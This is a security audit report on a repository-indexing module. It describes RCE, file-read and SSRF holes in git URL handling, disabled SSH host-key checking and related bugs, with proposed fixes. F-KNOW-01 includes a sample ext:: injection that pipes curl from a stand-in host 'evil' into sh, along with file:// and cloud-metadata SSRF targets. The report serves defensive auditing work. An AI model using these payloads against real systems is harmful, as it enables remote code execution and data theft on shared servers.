# Module 07 — Knowledge & Indexing — Audit Report

**Round 1** · 2026-06-24 · Scope this pass: repo clone/fetch path
(`knowledge/repo_analyzer.py`), `routes/repos.py`, `services/repository_service.py`, and the
git-SSH handling. **Deferred to round 2:** `pipeline_runner.py` checkpoint/resume correctness,
BM25/schema-embed snapshots, code graph/lineage/clustering, ChromaDB collection handling,
`indexing_artifacts.py` cleanup completeness.

Documented contract: the repo indexer is a checkpointed multi-stage pipeline; repos are cloned to
`repo_clone_base_dir / project_id`; the live GitAgent operates read-only on that local clone.

Severity: 🔴 Critical · 🟠 High · 🟡 Medium · 🟢 Low · ⚪ Info

---

## F-KNOW-01 — 🔴 Critical — Remote code execution / LFI / SSRF via unvalidated `repo_url` (git transport injection)

**Type:** Security (RCE)
**Location:** `knowledge/repo_analyzer.py:274-275` (`git ls-remote --heads {repo_url}`), `:419-424`
(`Repo.clone_from(repo_url, ...)`); `repo_url` accepted with **no scheme validation** at
`routes/repos.py:779` (`repo_url: str = Field(max_length=2000)`) and stored as-is. Confirmed by
observation **21201** ("Git protocol restrictions not configured, enabling ext:: RCE vector"); a
repo-wide search finds **no** `GIT_ALLOW_PROTOCOL` / `protocol.ext.allow` / scheme allowlist
anywhere.

**Description.** `repo_url` is user-supplied (project owner/editor) and passed verbatim to `git`
(via GitPython and `subprocess`). Git's `ext::` transport executes an arbitrary command:

```
repo_url = "ext::sh -c 'curl https://evil/x | sh'"
```

`git clone 'ext::…'` runs that command on the **indexing worker**. The same gap enables:
- **LFI / data theft:** `file:///etc/…` or `file:///app/...` clones local server paths into the
  indexed repo, which the user can then read back via codebase Q&A.
- **SSRF:** `http://169.254.169.254/…` / `http://internal-svc/…` — git fetches attacker-chosen
  internal URLs.

The `provider` field (`Literal["git_ssh","git_https",…]`) is **metadata only** — it does not
constrain the actual URL scheme. In multi-tenant SaaS, **any authenticated user who can create a
project and set a repo URL gets code execution on shared indexing infrastructure.**

**Impact.** Full RCE on the worker/dyno from any tenant; secondary LFI and SSRF. This is the
highest-severity finding in the audit so far.

**Proposed fix (defense in depth):**
1. **Set `GIT_ALLOW_PROTOCOL`** (e.g. `export GIT_ALLOW_PROTOCOL=https:ssh`) in the environment
   of every `git` invocation (`subprocess` env and GitPython `custom_environment`/`clone_from`
   env) so `ext::`/`file://`/`git://` are refused by git itself.
2. **Validate `repo_url` at the API boundary**: allowlist `https://` and `ssh://`/`git@…:…` SCP
   forms only; reject `ext::`, `file://`, `fd::`, `git://`, and anything else, with a strict
   `field_validator` on `RepoCreate`/update.
3. **Block internal targets** (resolve host, deny loopback/link-local/RFC-1918) to close the SSRF
   leg (shared with F-CONN-04).
4. Run the indexer in a network-egress-restricted, least-privilege sandbox.

---

## F-KNOW-02 — 🟡 Medium — Git-over-SSH clone disables host-key verification (`StrictHostKeyChecking=no`)

**Type:** Security (MITM) / inconsistency
**Location:** `knowledge/repo_analyzer.py:394` and `:408`
(`GIT_SSH_COMMAND = "ssh … -o StrictHostKeyChecking=no"`); also `:258` for `ls-remote`.

**Description.** All git-over-SSH clone/pull/ls-remote operations force
`StrictHostKeyChecking=no`, accepting any host key without verification. This directly
contradicts the Module-04 host-key policy work (`ssh_known_hosts.py`, `tofu`/`strict`) — the
indexing path uses a *separate, deliberately insecure* SSH configuration, leaving repo fetches
open to MITM (a tampered repo can then inject malicious code into the index / GitAgent answers).

**Proposed fix.** Route git-SSH through the same host-key policy: use a known_hosts file
(`-o UserKnownHostsFile=… -o StrictHostKeyChecking=accept-new` for TOFU, or `=yes` for strict),
consistent with `connect_with_policy`. Make the policy shared between the DB-tunnel and repo-clone
paths.

---

## F-KNOW-03 — 🟡 Medium — Editing `repo_url` doesn't re-point an existing clone (stale/wrong repo indexed)

**Type:** Bug (correctness / security-adjacent)
**Location:** `knowledge/repo_analyzer.py:410-416` (existing-clone branch fetches
`repo.remotes.origin` — the *original* URL — and ignores the passed `repo_url`).

**Description.** When `repo_dir` already exists, `clone_or_pull` fetches/pulls the existing
`origin` remote and never reconciles it with the (possibly changed) `repo_url` argument. If a user
updates `project.repo_url`, subsequent indexing keeps pulling the **old** repository until the
clone directory is manually deleted. Beyond the correctness bug, this means a URL that was set
maliciously and then "corrected" still indexes the old origin.

**Proposed fix.** On reuse, compare `repo.remotes.origin.url` to `repo_url`; if different,
`set_url` (or wipe + re-clone). Add a test: change `repo_url`, re-run, assert the new origin is
fetched.

---

## F-KNOW-04 — 🟢 Low — Passphrase-stripped private key written to a temp file during clone

**Type:** Security (credential exposure window)
**Location:** `knowledge/repo_analyzer.py:362-408`.

**Description.** The SSH key is decrypted, its **passphrase removed**
(`export_private_key("openssh")`), and either loaded into a transient `ssh-agent` or written to a
`tempfile.mkstemp` file (0600) as the fallback. The temp file is `os.unlink`ed in `finally`
(good), but an unprotected key briefly lives on disk and would leak if the process is `SIGKILL`ed
between write and cleanup. The agent PID is killed in `finally` too, but a crash can orphan it.

**Proposed fix.** Prefer the `ssh-agent` path exclusively (no on-disk key); if a temp file is
unavoidable, place it under a private per-process dir (`tempfile.mkdtemp`, 0700) and register an
`atexit`/signal handler to scrub it.

---

## F-KNOW-05 — 🟢 Low — `branch` is not validated (leading-dash / option-injection smell)

**Type:** Hardening
**Location:** `repo_analyzer.py:414` (`repo.git.checkout(branch)`), `:422`
(`clone_from(branch=branch)`); `routes/repos.py:781` (`branch: str = Field("main", max_length=200)`).

**Description.** `branch` is user-supplied and passed to git via GitPython. GitPython uses argument
lists (no shell), so shell injection isn't possible, but a value like `--upload-pack=…` or a
leading `-` is a known option-injection smell for `git` argument parsing and should be rejected.

**Proposed fix.** Validate `branch` against a safe ref pattern (`^[A-Za-z0-9._\-/]+$`, no leading
`-`) at the API boundary.

---

## Test gaps (⚪ Info)

- No test that `repo_url = "ext::…"`, `file://…`, or an internal `http://` is **rejected**
  (F-KNOW-01) — this is the highest-value regression test to add.
- No test that git-SSH clone verifies host keys (F-KNOW-02).
- No test that changing `repo_url` re-points an existing clone (F-KNOW-03).

## Summary

| id | sev | one-line |
|----|-----|----------|
| F-KNOW-01 | 🔴 | RCE/LFI/SSRF via unvalidated `repo_url` git transport (`ext::`, `file://`, internal http) |
| F-KNOW-02 | 🟡 | Git-SSH clone uses `StrictHostKeyChecking=no` → MITM (contradicts Module 04) |
| F-KNOW-03 | 🟡 | Editing `repo_url` doesn't re-point existing clone → stale/wrong repo indexed |
| F-KNOW-04 | 🟢 | Passphrase-stripped key briefly on disk during clone |
| F-KNOW-05 | 🟢 | `branch` not validated (option-injection smell) |

**Next-round focus (Module 07 deep dive):** `pipeline_runner.py` checkpoint/resume (does
`code_graph` rehydrate correctly; can a resumed run skip safety stages?); `indexing_artifacts.py`
cleanup completeness (orphaned ChromaDB collections / BM25 `.pkl` on delete — ties to F-AUTH-01
cascade); ChromaDB collection naming collisions across projects; BM25 pickle **deserialization**
trust (is any `.pkl` ever loaded from an untrusted path?); doc_generator failure-ratio gate.
